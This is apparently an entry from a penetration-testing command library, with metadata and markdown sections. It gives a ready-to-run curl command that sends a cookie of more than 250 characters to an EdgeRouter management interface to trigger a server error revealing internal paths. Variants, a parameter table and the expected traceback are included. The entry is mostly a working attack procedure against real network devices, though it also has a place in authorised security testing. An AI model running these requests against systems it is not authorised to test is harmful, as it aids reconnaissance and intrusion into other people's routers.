---
data: >-
  curl -X GET "http://TARGET_IP/" -H "Cookie: beaker.session.id=LONG_PAYLOAD" -H
  "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
  Firefox/52.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -v
tags:
  - http
  - cookie
  - path-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.327Z'
id: e280d859-7466-4be3-b8e3-f7bd5d67ef15
verified: false
validated: true
submitted: true
---
# Send-Long-Session-ID-Cookie-for-Path-Disclosure

## Command

```bash
curl -X GET "http://192.168.1.1/" -H "Cookie: beaker.session.id=v8iG24fDKn8x5uD3V2uICZA1FJEoUJpqH5VTa03xB5blDRNOe5AfFp2GNIBpDX8th1IO8sS5ejsz4Swm175nUvipwU211S4n4RtCv0A6r18fsgJbrrbmhFT9k2cAXF3yyg0Uu0B0wPOWP7BOrMVnXp44aHoXSfJ06ZXk7HrD5J5R9AZIgQLmGutM9ESNxw3CVJtW4Rfxeh7JE2AD04B3g78FxRgBxY82I2Gzf6ZPMsc39d37LM90dd9cFA" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -v
```

## Description

Sends an HTTP GET request to the EdgeRouter root path with a 250+ character beaker.session.id cookie to trigger a server error exposing internal paths in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| TARGET_IP | IP of the EdgeRouter management interface (e.g., 192.168.1.1) | Yes |
| LONG_PAYLOAD | String >249 chars for beaker.session.id (e.g., random alphanumeric) | Yes |
| -v | Verbose output to see full response | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://192.168.1.1/" -H "Cookie: beaker.session.id=$(openssl rand -hex 125)" -v
```

### Advanced Usage

```bash
curl -X GET "https://192.168.1.1/" -k -H "Cookie: beaker.session.id=$(head -c 250 /dev/urandom | tr -dc 'a-zA-Z0-9')" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

HTTP 500 error or Python traceback in response body, e.g., "FileNotFoundError: [Errno 2] No such file or directory: '/var/run/beaker/container_file/LONG_PAYLOAD.cache'", revealing paths like /var/run/beaker/container_file/.

## Related

- [[Related Procedure: Trigger-Path-Disclosure-with-Long-Session-ID]]
